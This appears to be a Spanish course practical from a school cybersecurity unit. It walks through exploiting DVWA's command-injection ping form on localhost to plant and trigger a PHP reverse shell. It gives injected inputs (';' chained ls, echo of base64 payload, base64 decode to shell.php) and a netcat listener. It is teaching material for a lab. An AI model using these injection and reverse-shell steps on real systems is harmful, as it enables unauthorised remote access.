---
typora-copy-images-to: ../assets/img/fileupload
typora-root-url: ../../
layout: post
categories: tema4 Command Injection
title: Command Injection
conToc: false
author: Víctor Ponz
conToc: true
titlepage: true
titlepage-background: assets/img/riesgos.png
page-background:  assets/img/fondo-pagina.png
urlcolor: CornflowerBlue
linkcolor: black
toc-own-page: true
toc-title: Contenidos
header-left: UD 4. Command Injection
header-right: Ciberseguridad
footer-left: IES El Caminàs
footer-right: \thepage/\pageref{LastPage}
titlepage-rule-color: 1e2c37
header-includes: |
    \usepackage{lastpage} 
    \usepackage{awesomebox}
pandoc-latex-environment:
    noteblock: [note]
    tipblock: [tip]
    warningblock: [warning]
    cautionblock: [caution]
    importantblock: [important]
---

## Práctica - Command injection

> La inyección de comandos es un ataque en el que el objetivo es la ejecución de comandos arbitrarios en el sistema operativo host a través de una aplicación vulnerable. Los ataques de inyección de comandos son posibles cuando una aplicación pasa datos no seguros proporcionados por el usuario (formularios, cookies, encabezados HTTP, etc.) a un shell del sistema. En este ataque, los comandos del sistema operativo proporcionados por el atacante generalmente se ejecutan con los privilegios de la aplicación vulnerable. Los ataques de inyección de comandos son posibles en gran parte debido a una validación de entrada insuficiente.

En la **siguiente práctica** vamos a realizar un *reverse shell* mediante la inyección  de comandos desde un campo de texto de un formulario que no realiza una validación de entrada correcta.

Este es una variante del ataque **FileUpload** ya que persigue almacenar un fichero ejecutable con dicho reverse shell.

La máquina DVWA tiene un fallo de seguridad en la página [Command Injection](http://localhost:8080/vulnerabilities/exec/).

![Command Injection](/Ciberseguridad-PePS/assets/img/fileupload/image-20210504191910879.png)

En este formulario se supone que el usuario puede poner una IP a la que hacerle ping. Para descubrir si es vulnerable a Command injection podemos introducir el siguiente comando:

```
127.0.0.1 ; ls
```

Lo que intentamos es que el servidor ejecute también el comando `ls` ya que suponemos que esta es la instrucción que realiza el `ping`

```php
 $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
```

y no comprueba si `$target` es una IP Válida.

**Los pasos son los siguientes:**

## Paso 1
Descarga el archivo del *reverse shell* desde esta [dirección](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) y guárdalo como `shell.php`

## Paso 2 
Edítalo y cambia la IP por la de tu equipo

![Reverse shell](/Ciberseguridad-PePS/assets/img/fileupload/image-20210504175459944.png)


## Paso 3
Ahora vamos a codificarlo en [base 64](https://www.base64encode.org/.)  

   > **Nota**. Para que ocupe menos espacio es recomendable eliminar los comentarios 

## Paso 4
Nos aprovecharnos de la vulnerabilidad para crear un archivo en el servidor mediante la siguiente entrada en el formulario:

   ```
   127.0.0.1 ; echo "pega-aquí-el-código-en-base64" > shell.txt
   ```

   Con este comando estamos creando el archivo `shell.txt` con el código en base64.

## Paso 5
Decodificamos el código mediante la siguiente entrada

   ```
   127.0.0.1 ; cat shell.txt | base64 -d > shell.php
   ```

## Paso 6
Ya sólo nos queda ejecutar en el ordenador del atacante el comando `netcat`

    nc -v -n -l -p 1234

## Paso 7
Y quedarnos a la espera de una conexión entrante desde el ordenador de la víctima al visitar la url [localhost:8080/vulnerabilities/exec/shell.php](localhost:8080/vulnerabilities/exec/shell.php) del punto 5.

 ![Remote shell](/Ciberseguridad-PePS/assets/img/fileupload/image-20210504193946369.png)

